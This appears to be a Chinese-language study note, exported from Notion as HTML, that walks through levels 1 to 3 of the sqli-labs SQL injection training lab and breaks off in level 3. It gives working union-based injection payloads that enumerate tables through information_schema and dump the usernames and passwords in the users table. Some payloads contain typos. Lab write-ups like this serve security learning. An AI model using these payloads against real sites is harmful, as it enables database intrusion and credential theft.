@@ -1,0 +1,865 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>SQL注入</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+
+	table.collection-content {
+		width: 100%;
+		table-layout: fixed;
+	}
+
+	table.collection-content th,
+	table.collection-content td {
+		overflow-wrap: anywhere;
+	}
+
+	table.collection-content td > .user,
+	table.collection-content td > time {
+		white-space: pre-wrap;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content-wrapper {
+	overflow-x: auto;
+}
+
+@media only print {
+	.collection-content-wrapper {
+		overflow-x: visible;
+	}
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	gap: 46px;
+}
+
+.column {
+	min-width: 0;
+	overflow: hidden;
+}
+
+.column > *:first-child {
+	margin-top: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+table {
+	border-collapse: collapse;
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol.numbered-list.numbered-list-digits-2 {
+	padding-inline-start: 2em;
+}
+
+ol.numbered-list.numbered-list-digits-3plus {
+	padding-inline-start: 2.4em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="b0a8db55-6aee-82d5-aa3d-01c199b91b9f" class="page mono"><header><h1 class="page-title" dir="auto">SQL注入</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="auto"><ul id="35d8db55-6aee-8211-87a7-012fcd6c2ad5" class="toggle"><li><details open=""><summary>sqli-labs</summary><div style="display:contents" dir="auto"><ul id="9258db55-6aee-82b7-b7e4-817c060d518d" class="toggle"><li><details open=""><summary>第一关</summary><div style="display:contents" dir="auto"><p id="d3a8db55-6aee-822f-8256-815a10d5d177" class="">1、首先观察让我们输入一个数字，尝试：</p></div><div style="display:contents" dir="auto"><p id="8d48db55-6aee-83ca-adcc-81ff00f264a3" class=""><code>?id=1</code></p></div><div style="display:contents" dir="ltr"><figure id="5ac8db55-6aee-8232-8d9c-81adfe4d1550" class="image"><a href="SQL%E6%B3%A8%E5%85%A5/1.png"><img style="width:2325px" src="SQL%E6%B3%A8%E5%85%A5/1.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="6b98db55-6aee-821b-bbcb-818f9a9180fd" class="">可以获得信息（按照提示来）</p></div><div style="display:contents" dir="auto"><p id="11f8db55-6aee-83ff-a031-8144c1a0ce87" class="">2、尝试是否有字符注入漏洞（第一张图输入错误，因为提示输入数字，<code>&#x27;or 1=1—+什么也没输入</code>）</p></div><div style="display:contents" dir="auto"><p id="e468db55-6aee-83cd-ae37-01228303b144" class=""><code>?id=1&#x27; --+</code></p></div><div style="display:contents" dir="ltr"><figure id="7e88db55-6aee-82f6-8478-0128e2c9b5d7" class="image"><a href="SQL%E6%B3%A8%E5%85%A5/2.png"><img style="width:2596px" src="SQL%E6%B3%A8%E5%85%A5/2.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="0778db55-6aee-822c-ac6a-813dc0564b22" class="image"><a href="SQL%E6%B3%A8%E5%85%A5/3.png"><img style="width:2362px" src="SQL%E6%B3%A8%E5%85%A5/3.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="1048db55-6aee-8201-bab9-0166d18c791a" class="">正确输入后（下面的图）可以获取信息，表示存在字符型注入。</p></div><div style="display:contents" dir="auto"><p id="ef48db55-6aee-82fd-b28c-010195240c4e" class="">3、查看表有几列，用<code>order by 3</code> 如果数字超出实际列数，会报错。</p></div><div style="display:contents" dir="auto"><p id="8f88db55-6aee-83c1-b3ad-81ac79c9d66e" class="">如下：3时，没有报错；4的时候就报错了</p></div><div style="display:contents" dir="auto"><p id="37d8db55-6aee-8203-aab7-011f8b681b11" class=""><code>?id=1’ order by 3 —+</code></p></div><div style="display:contents" dir="ltr"><figure id="82d8db55-6aee-8384-8c1b-01e875d57e3b" class="image"><a href="SQL%E6%B3%A8%E5%85%A5/4.png"><img style="width:2460px" src="SQL%E6%B3%A8%E5%85%A5/4.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="60b8db55-6aee-833a-871c-81b5c448f37f" class="image"><a href="SQL%E6%B3%A8%E5%85%A5/5.png"><img style="width:2420px" src="SQL%E6%B3%A8%E5%85%A5/5.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="bd58db55-6aee-8226-a4f7-017c64f3b926" class="">4、爆出显示位，即返回信息显示是那一列，在什么位置显示</p></div><div style="display:contents" dir="auto"><p id="35e8db55-6aee-82f9-9031-812485d6a804" class="">注意这里是<code>id=-1</code> ，因为如果是正常数字，会返回数据，而不是我们需要的信息。</p></div><div style="display:contents" dir="auto"><p id="fc68db55-6aee-83a5-b3b2-01c2bbe00fdc" class=""><code>?id=-1&#x27;union select 1,2,3--+</code><div class="indented"><div style="display:contents" dir="ltr"><figure id="b138db55-6aee-83e3-bbee-81f861ae8ed8" class="image"><a href="SQL%E6%B3%A8%E5%85%A5/f547a64ec10226068339de57f56feadd.png"><img style="width:630px" src="SQL%E6%B3%A8%E5%85%A5/f547a64ec10226068339de57f56feadd.png"/></a></figure></div></div></p></div><div style="display:contents" dir="auto"><p id="6b48db55-6aee-83f8-9f94-8147df83946f" class="">
+</p></div><div style="display:contents" dir="auto"><p id="24c8db55-6aee-8308-9485-01d7fd78bdb9" class="">5、获取数据名和版本号，用函数<code>database()和version()</code> </p></div><div style="display:contents" dir="auto"><p id="d488db55-6aee-8286-994e-014dfe72c9d8" class=""><code>?id=-1?union select 1, database(), version() —+</code></p></div><div style="display:contents" dir="ltr"><figure id="4ed8db55-6aee-82f0-9c2b-81e8f1859ad0" class="image"><a href="SQL%E6%B3%A8%E5%85%A5/6.png"><img style="width:2352px" src="SQL%E6%B3%A8%E5%85%A5/6.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="cb48db55-6aee-830c-bcaa-01a384ac54b0" class="">6、爆表，查询infomation_schema数据库下tables表里面，且table_schema字段内容为security的所有table_name的内容。直观点如下：</p></div><div style="display:contents" dir="ltr"><figure id="3158db55-6aee-83f1-b10d-81ee6eafaff3" class="image"><a href="SQL%E6%B3%A8%E5%85%A5/220248ddd4b1139c6bc723e3eedacb4a.png"><img style="width:587.98828125px" src="SQL%E6%B3%A8%E5%85%A5/220248ddd4b1139c6bc723e3eedacb4a.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="8bd8db55-6aee-8352-bbca-01420a916e33" class=""><code>?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</code></p></div><div style="display:contents" dir="ltr"><figure id="a448db55-6aee-836e-9bc8-811aa87d1362" class="image"><a href="SQL%E6%B3%A8%E5%85%A5/7.png"><img style="width:2437px" src="SQL%E6%B3%A8%E5%85%A5/7.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="34d8db55-6aee-83a7-9f42-01340d7103da" class="">7、查询出了四个表，猜测最有可能有账号密码的表在users中，所以接下来就是报字段，即得到该表下的字段名以及内容</p></div><div style="display:contents" dir="auto"><p id="6198db55-6aee-830d-ae96-0195b7ea6cfa" class=""><code>?id=-1&#x27;union select 1,2,group_concat(column_name)from infomation_schema.colums where table_name=’uesrs’ —+</code></p></div><div style="display:contents" dir="ltr"><figure id="f028db55-6aee-838c-b12e-01cf4c0dc00a" class="image"><a href="SQL%E6%B3%A8%E5%85%A5/8.png"><img style="width:2464px" src="SQL%E6%B3%A8%E5%85%A5/8.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="3578db55-6aee-839c-b758-81b881481bd4" class="">8、找到敏感字段username和password，接下来就是操作这两个字段对应的内容。（可以自己在中间加个表示分割username和password）</p></div><div style="display:contents" dir="auto"><p id="d2c8db55-6aee-8236-877c-813b31808827" class=""><code>?id=-1&#x27;union select 1,2,group_concat(username, id, password) from users —+</code></p></div><div style="display:contents" dir="ltr"><figure id="8a58db55-6aee-833b-8a15-01a97f4dc0e7" class="image"><a href="SQL%E6%B3%A8%E5%85%A5/9.png"><img style="width:2518px" src="SQL%E6%B3%A8%E5%85%A5/9.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="1f28db55-6aee-8320-9232-81da25e7ed60" class="">过关</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="a7c8db55-6aee-825e-8534-818c586e6f80" class="toggle"><li><details open=""><summary>第二关</summary><div style="display:contents" dir="auto"><p id="c098db55-6aee-823c-901e-81f5ea963935" class="">1、判断类型发现是数字型，因为输入<code>?id=1’ —+</code> 结果如下：</p></div><div style="display:contents" dir="ltr"><figure id="fad8db55-6aee-82d2-ae91-017d164154d4" class="image"><a href="SQL%E6%B3%A8%E5%85%A5/2%201.png"><img style="width:2111px" src="SQL%E6%B3%A8%E5%85%A5/2%201.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="9b08db55-6aee-8325-a9c6-8106bc73dc29" class="">其余与第一关相同</p></div><div style="display:contents" dir="auto"><p id="bc78db55-6aee-8384-b183-811bbe6cee0f" class="">更改注入为：</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js" integrity="sha512-sijCOJblSCXYYmXdwvqV0tak8QJW5iy2yLB1wAbbLc3OOIueqymizRFWUS/mwKctnzPKpNdPJV3aK1zlDMJmXQ==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="7228db55-6aee-8295-8329-018054e9c1ff" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;
+&quot;SELECT * FROM users WHERE id=1 &#x27; LIMIT 0,1&quot; -- 出错信息。
+ 
+ 
+?id=1 order by 3
+?id=-1 union select 1,2,3
+?id=-1 union select 1,database(),version()
+?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;
+?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;
+?id=-1 union select 1,2,group_concat(username ,id , password) from users</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="4ed8db55-6aee-822b-8987-814595312256" class="toggle"><li><details open=""><summary>第三关</summary><div style="display:contents" dir="auto"><p id="2598db55-6aee-8232-81a4-018a3f6c5c10" class="">1、输入<code>?id=1&#x27;</code>看到报错为“1”）LIMIT 0，1，即判断sql是单引号字符型且有括号，所以构造有括号的单引号类型即可。<code>?id=1&#x27;)</code> </p></div><div style="display:contents" dir="auto"><p id="04f8db55-6aee-8283-ae46-01c7c9a13844" class="">其他与前两关相同</p></div><div style="display:contents" dir="ltr"><figure id="5f28db55-6aee-8247-be94-01e12b599488" class="image"><a href="SQL%E6%B3%A8%E5%85%A5/1%201.png"><img style="width:2331px" src="SQL%E6%B3%A8%E5%85%A5/1%201.png"/></a></figure></div><div style="display:contents" dir="auto"><pre id="6018db55-6aee-82ec-b9f9-8172671afc11" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">?id=2&#x27;)--+
+?id=1&#x27;) order by 3--+
+?id=-1&#x27;) union select 1,2,3--+
+?id=-1&#x27;) union select 1,database(),version()--+
+?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+
+?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+
